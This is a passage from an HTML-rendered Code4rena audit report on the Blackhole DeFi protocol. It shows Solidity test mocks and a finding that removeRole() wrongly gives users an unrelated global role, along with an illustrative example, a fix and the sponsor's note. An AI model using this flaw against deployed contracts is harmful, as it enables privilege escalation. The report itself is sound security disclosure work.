class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epragma solidity ^0.8.13;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// Corrected path: go up one level from \u0026#39;mocks\u0026#39; to \u0026#39;contracts\u0026#39;, then into \u0026#39;interfaces\u0026#39;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport { IBlackGovernor } from \u0026quot;../interfaces/IBlackGovernor.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract GaugeManagerMock {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public blackGovernor;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    uint256 public lastRewardAmount; // Added to observe notified amount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function notifyRewardAmount(uint256 amount) external {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lastRewardAmount = amount;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function getBlackGovernor() external view returns (address) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return blackGovernor;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function setBlackGovernor(address _gov) external { // Added for setup convenience\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackGovernor = _gov;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003econtracts/mocks/RewardsDistributorMock.sol\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epragma solidity ^0.8.13;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract RewardsDistributorMock {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // event TokenCheckpointed(); // Optional: if you want to verify it\u0026#39;s called\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function checkpoint_token() external {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // emit TokenCheckpointed(); // Optional\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003econtracts/mocks/BlackGovernorMock.sol\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epragma solidity ^0.8.13;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// Assuming IBlackGovernor.sol is in contracts/interfaces/\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// Corrected path: go up one level from \u0026#39;mocks\u0026#39; to \u0026#39;contracts\u0026#39;, then into \u0026#39;interfaces\u0026#39;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport { IBlackGovernor } from \u0026quot;../interfaces/IBlackGovernor.sol\u0026quot;; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract BlackGovernorMock {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    IBlackGovernor.ProposalState public mockProposalState = IBlackGovernor.ProposalState.Pending;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function status() external view returns (IBlackGovernor.ProposalState) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return mockProposalState;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Helper to change state for testing if needed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function setMockProposalState(IBlackGovernor.ProposalState _newState) external {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        mockProposalState = _newState;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-2\"\u003elonelybones\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-50\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-67\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles\" style=\"position:relative;\"\u003e\u003ca href=\"#m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles\" aria-label=\"m 02 critical access control flaw role removal logic incorrectly grants unauthorized roles permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-218\"\u003e[M-02] Critical access control flaw: Role removal logic incorrectly grants unauthorized roles\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-184\"\u003erayss\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-311\"\u003eKineticsOfWeb3\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/PermissionsRegistry.sol#L113\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/PermissionsRegistry.sol#L113\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-1\" aria-label=\"finding description 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eremoveRole()\u003c/code\u003e function incorrectly updates a user’s role list by replacing a removed role with the last role from the \u003ccode\u003eglobal_roles\u003c/code\u003e array. This results in unintended and unauthorized role assignments to users.\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eremoveRole()\u003c/code\u003e function correctly removes a role from the system by deleting it from the global roles list. However, when updating the users’ assigned roles arrays, the current logic mistakenly replaces the removed role with the last role from the global roles list rather than just deleting the role from the array. \u003c/p\u003e\n\u003cp\u003eWhen removing a role from a user’s assigned roles array (\u003ccode\u003e_addressToRoles[user]\u003c/code\u003e), the function tries to keep the array compact by replacing the role to be removed with the last element of the \u003ccode\u003eglobal_roles\u003c/code\u003e array. This is incorrect because it mistakenly assigns a completely unrelated role from the global roles list to the user, corrupting their role assignments.\u003c/p\u003e\n\u003cp\u003eThis causes unrelated global roles to be incorrectly assigned to the user whose role is being removed.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-example\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-example\" aria-label=\"proof of concept example permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept (Example)\u003c/h3\u003e\n\u003cp\u003eAssume the \u003ccode\u003eglobal_roles\u003c/code\u003e array contains:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GOVERNANCE\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;VOTER_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BRIBE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAlice has two roles:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003e_addressToRoles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAlice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = [\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;VOTER_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCalling \u003ccode\u003eremoveRole(\"GAUGE_ADMIN\")\u003c/code\u003e results in:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003e_addressToRoles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAlice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_roles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_roles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// \u0026quot;BRIBE_ADMIN\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003e_addressToRoles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAlice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epop\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// removes last element\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAlice’s roles become:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;VOTER_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BRIBE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow Alice has Alice unintentionally gains the \u003ccode\u003eBRIBE_ADMIN\u003c/code\u003e role without authorization.\u003c/p\u003e\n\u003ch3 id=\"impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThis bug leads to privilege escalation — a user can be granted a role they were never assigned, simply due to role removal logic. If roles like \u003ccode\u003eBRIBE_ADMIN\u003c/code\u003e or \u003ccode\u003eGAUGE_ADMIN\u003c/code\u003e are mistakenly granted.\u003c/li\u003e\n\u003cli\u003eBroken access control due to corrupted role removal logic.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"severity-justification\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-justification\" aria-label=\"severity justification permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Justification\u003c/h3\u003e\n\u003cp\u003eThis issue is classified as high severity because it directly compromises the integrity of the protocol’s access control system. By unintentionally assigning incorrect roles during the removal process, users may be granted powerful administrative permissions such as \u003ccode\u003eGAUGE_ADMIN\u003c/code\u003e or \u003ccode\u003eBRIBE_ADMIN\u003c/code\u003e (or any other role) without proper authorization. These roles often govern critical operations, which can influence protocol behavior.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]) == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_role\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Replace with last element\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epop\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();                    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Remove last element\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ebreak\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe mitigation correctly updates the user’s assigned roles array (\u003ccode\u003e_addressToRoles[user]\u003c/code\u003e) without referencing the \u003ccode\u003eglobal_roles\u003c/code\u003e array. When removing a role, it swaps the role to be removed with the last element in the user’s own roles array and then removes (pops) the last element. This preserves the compactness and order of the array while ensuring only roles actually assigned to the user remain.\u003c/p\u003e\n\u003cp\u003eCrucially, it avoids mistakenly assigning unrelated roles from the \u003ccode\u003eglobal_roles\u003c/code\u003e list, preventing corruption of the user’s role data and maintaining accurate access control.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-30\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-21\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The 